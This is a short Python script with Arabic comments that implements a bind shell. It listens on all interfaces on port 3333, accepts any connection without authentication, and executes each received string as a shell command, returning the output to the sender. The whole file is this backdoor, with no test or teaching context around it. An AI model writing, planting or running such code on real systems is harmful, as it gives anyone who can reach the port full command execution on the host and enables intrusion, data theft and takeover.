#!/usr/bin/env python3
import socket
import subprocess
import os

# إعدادات الاتصال
HOST = '0.0.0.0'  # استمع على جميع الواجهات
PORT = 3333  # المنفذ الجديد

def execute_command(cmd):
    """تنفيذ الأمر وإرجاع النتيجة"""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"خطأ: {e.output}"

def main():
    # إنشاء سوكيت
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    
    print(f"[+] استماع على {HOST}:{PORT}")
    
    while True:
        client, addr = server.accept()
        print(f"[+] اتصال من {addr}")
        
        try:
            while True:
                # استقبال الأمر
                cmd = client.recv(4096).decode()
                if not cmd or cmd.lower() == 'exit':
                    break
                
                # تنفيذ الأمر
                output = execute_command(cmd)
                
                # إرسال النتيجة
                client.send(output.encode())
                
        except Exception as e:
            print(f"[-] خطأ: {e}")
        finally:
            client.close()
            print(f"[-] انقطع الاتصال من {addr}")

if __name__ == '__main__':
    main()
